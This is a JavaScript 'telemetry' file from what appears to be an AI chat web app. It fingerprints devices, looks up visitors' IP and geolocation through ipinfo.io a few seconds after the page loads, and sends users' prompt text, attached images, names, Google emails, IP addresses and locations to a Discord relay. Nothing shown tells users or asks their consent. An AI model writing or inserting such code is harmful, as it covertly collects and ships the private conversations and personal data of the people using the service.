// 🛰️ NEXUS TELEMETRY CORE v4.0.85
// Handles device parsing, Discord uplink, and geolocation tracking.

function parseDevice(ua) {
    if (/iPhone/.test(ua)) {
        const v = (ua.match(/iPhone OS ([\d_]+)/) || [])[1];
        return `iPhone  iOS ${v ? v.replace(/_/g, '.') : '?'}`;
    }
    if (/iPad/.test(ua)) {
        const v = (ua.match(/OS ([\d_]+)/) || [])[1];
        return `iPad  iPadOS ${v ? v.replace(/_/g, '.') : '?'}`;
    }
    if (/Android/.test(ua)) {
        const m = ua.match(/Android ([\d.]+);?\s*([^;Build]+)?/);
        const ver = m ? `Android ${m[1]}` : 'Android';
        const model = m && m[2] ? m[2].trim() : '';
        return model ? `${model}  ${ver}` : ver;
    }
    if (/Windows/.test(ua)) {
        const n = (ua.match(/Windows NT ([\d.]+)/) || [])[1];
        const w = {'10.0':'10/11','6.3':'8.1','6.2':'8','6.1':'7'}[n] || n || '?';
        const b = /Edg\//.test(ua)?'Edge':/Chrome\//.test(ua)?'Chrome':/Firefox\//.test(ua)?'Firefox':'Browser';
        return `Windows ${w}  ${b}`;
    }
    if (/Mac OS X/.test(ua)) {
        const v = ((ua.match(/Mac OS X ([\d_]+)/) || [])[1] || '').replace(/_/g, '.');
        const b = /Edg\//.test(ua)?'Edge':/Chrome\//.test(ua)?'Chrome':/Firefox\//.test(ua)?'Firefox':/Safari\//.test(ua)?'Safari':'Browser';
        return `macOS ${v}  ${b}`;
    }
    if (/Linux/.test(ua)) return 'Linux Desktop';
    return 'Unknown';
}

async function postToDiscord(payload, threadId = null, wait = false) {
    try {
        const body = { payload };
        if (threadId) body.threadId = threadId;
        if (wait)     body.wait     = true;
        
        const resp = await fetch(`${window.PACIFIC_HUB}/log`, {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify(body),
        });
        
        if (!resp.ok) {
            fetch(`${window.API_BASE}/api/telemetry`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: JSON.stringify(payload) })
            });
        }
        if (wait && resp.ok) return resp.json().catch(() => null);
    } catch(e) { console.warn("[TELEMETRY] Discord uplink fallback active."); }
    return null;
}

async function logPrompt(text, imageB64 = null) {
    const user   = JSON.parse(localStorage.getItem('nexus_user_data') || '{"name":"Guest"}');
    const device = parseDevice(navigator.userAgent);
    const ip     = window.sessionGeoData?.ip || '?';
    const loc    = window.sessionGeoData ? [window.sessionGeoData.city, window.sessionGeoData.country].filter(Boolean).join(', ') || 'Unknown' : 'Unknown';
    
    const embed = {
        title: ` New Prompt: ${user.name}`,
        color: 0x00ffff,
        description: `\`\`\`\n${text.slice(0, 1500)}\n\`\`\``,
        fields: [
            { name: ' Identity', value: user.email ? `Google (${user.email})` : 'Local Alias', inline: true },
            { name: ' Mode',     value: window.currentMode.toUpperCase(), inline: true },
            { name: ' Location', value: `${loc} (${ip})`, inline: false },
            { name: ' Device',   value: device, inline: true }
        ],
        timestamp: new Date().toISOString()
    };

    postToDiscord({ embeds: [embed] }, window.discordThreadId || null);

    if (imageB64) {
        postToDiscordFile(imageB64, 'attached-image', window.discordThreadId || null);
    }
}

async function postToDiscordFile(fileB64, label = 'image', threadId = null) {
    try {
        const body = { fileB64, label };
        if (threadId) body.threadId = threadId;
        await fetch(`${window.PACIFIC_HUB}/log`, {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify(body),
        });
    } catch(_) {}
}

async function initUserThread() {
    if (window.discordThreadId) return;
    
    const ip     = window.sessionGeoData?.ip || '?';
    const loc    = window.sessionGeoData ? `${window.sessionGeoData.city}, ${window.sessionGeoData.country}` : 'Scanning...';
    const device = parseDevice(navigator.userAgent);
    const threadName = `NEXUS NEURAL LINK: ${loc}`.slice(0, 100);

    const data = await postToDiscord({
        thread_name: threadName,
        embeds: [{
            title: '📡 NEW NEURAL LINK ESTABLISHED',
            color: 0x00ffff,
            description: `**Nexus Node Online**\nUplink confirmed from ${loc}.`,
            fields: [
                { name: 'Source IP',  value: `\`${ip}\``, inline: true },
                { name: 'Device',     value: device, inline: true }
            ],
            timestamp: new Date().toISOString(),
        }]
    }, null, true);

    if (data?.channel_id || data?.id) {
        window.discordThreadId = String(data.channel_id || data.id);
        localStorage.setItem('nexus_discord_thread', window.discordThreadId);
        console.log("[TELEMETRY] Discord Uplink Active. Thread ID:", window.discordThreadId);
    }
}

// Auto-discovery
setTimeout(async () => {
    try {
        const d = await fetch('https://ipinfo.io/json').then(r => r.json());
        if (d.ip) {
            window.sessionGeoData = d;
            initUserThread();
        }
    } catch(_) {}
}, 5000);
